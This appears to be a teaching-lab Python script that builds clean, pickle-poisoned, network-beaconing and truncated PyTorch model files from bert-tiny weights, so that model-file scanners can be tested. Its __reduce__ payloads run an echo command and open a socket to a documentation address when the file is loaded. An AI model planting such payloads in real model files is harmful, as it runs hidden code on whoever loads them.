"""
Builds a PyTorch model file from the real prajjwal1/bert-tiny weights.

This is lab 1's script with ONE mode added. If you did lab 1, you have already
read the first two:

    --clean     save the genuine weights exactly as they came
    --poison    save the same weights PLUS one extra object that runs a
                command when the file is loaded
    --beacon    save the same weights PLUS one extra object that opens a
                network connection when the file is loaded   <- new in lab 9
    --corrupt   the --poison file with the last byte of its pickle stream
                clipped off, so the stream ends mid-sentence  <- new in lab 9

Same weights every time. Same file type. The only difference is one dictionary
key - and that is enough to change a scanner's verdict.

Neither payload does anything harmful. --poison runs a plain `echo`. --beacon
dials an address in 203.0.113.0/24, which is RFC 5737 TEST-NET-3: reserved for
documentation and not routable on the internet. The lab also runs with no
network at all, and the sandbox harness refuses the connection before the
system call is made. Nothing leaves this container.
"""
import argparse
import json
import os
import socket
import zipfile

import torch

ASSETS = json.load(open("/opt/lab-assets/asset_paths.json"))
ORIGINAL = ASSETS["pytorch_model.bin"]


class HarmlessPayload:
    """The payload from lab 1.

    __reduce__ is Python's way of telling pickle "to rebuild me, call this
    function with these arguments." Pickle obeys - at load time, before the
    model has been used for anything.

    That is the entire vulnerability. A pickle-based model file is not data.
    It is a program.
    """

    def __reduce__(self):
        return (
            os.system,
            ("echo '>>> Synthetic payload executed. A real attack would not be an echo. <<<'",),
        )


class BeaconPayload:
    """The payload lab 9 adds.

    Same mechanism, different verb. This one does not execute a command - it
    opens a socket. That difference is the point of the third scan: a scanner
    hunting for code execution is answering a different question, and
    answering it correctly.

    203.0.113.10 is TEST-NET-3 (RFC 5737), reserved for documentation. It
    routes nowhere.
    """

    def __reduce__(self):
        return (socket.create_connection, (("203.0.113.10", 4444), 3))


def clip_last_byte(src, out):
    """Rebuild the archive with one byte missing from the end of the pickle.

    This is the shape of the nullifAI models found on Hugging Face in 2025:
    a payload at the front of a stream that stops before it should. Pickle
    executes as it reads, so the payload has already run by the time the
    reader falls off the end. The file is broken; it is not harmless.
    """
    zin = zipfile.ZipFile(src)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename.endswith("data.pkl"):
                data = data[:-1]
            # Pass the ZipInfo, not the name. Handing writestr a bare string
            # stamps it with the current time, and the file's hash would then
            # change on every build - which would make the block list in this
            # lab look broken.
            zout.writestr(item, data)
    zin.close()


MODES = {
    "clean": (None, "bert_tiny_clean.pt", "Saving the weights unchanged."),
    "poison": (HarmlessPayload, "bert_tiny_poisoned.pt",
               "Added 1 hidden payload object to the weight dictionary."),
    "beacon": (BeaconPayload, "bert_tiny_beacon.pt",
               "Added 1 hidden network-callback object to the weight dictionary."),
    "corrupt": (HarmlessPayload, "bert_tiny_corrupt.pt",
                "Added 1 hidden payload object, then clipped the stream short."),
}


def build(mode):
    payload, out, note = MODES[mode]

    # weights_only=True tells PyTorch to rebuild tensors but NOT to let the
    # file run code. Reading is safe even if the file were hostile.
    state_dict = torch.load(ORIGINAL, weights_only=True)
    print(f"Loaded {len(state_dict)} real weight tensors from prajjwal1/bert-tiny.")

    if payload is not None:
        state_dict["_security_demo_payload"] = payload()
    print(note)

    # torch.save serializes with pickle, so whatever is in the dictionary
    # gets baked into the file.
    if mode == "corrupt":
        torch.save(state_dict, out + ".tmp")
        clip_last_byte(out + ".tmp", out)
        os.unlink(out + ".tmp")
        print("Clipped the last byte of the pickle stream.")
    else:
        torch.save(state_dict, out)
    print(f"Wrote {out}  ({os.path.getsize(out) / 1e6:.1f} MB)")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Build a clean, poisoned, beaconing or corrupt model file.")
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--clean", action="store_true", help="save the genuine weights unchanged")
    mode.add_argument("--poison", action="store_true", help="add the command-execution payload")
    mode.add_argument("--beacon", action="store_true", help="add the network-callback payload")
    mode.add_argument("--corrupt", action="store_true",
                      help="add the command payload, then clip the pickle stream short")
    mode.add_argument("--all", action="store_true",
                      help="build all four, which is what the lab needs")
    args = ap.parse_args()
    if args.all:
        for name in ("clean", "poison", "beacon", "corrupt"):
            build(name)
            print()
    else:
        for name in ("clean", "poison", "beacon", "corrupt"):
            if getattr(args, name):
                build(name)
                break
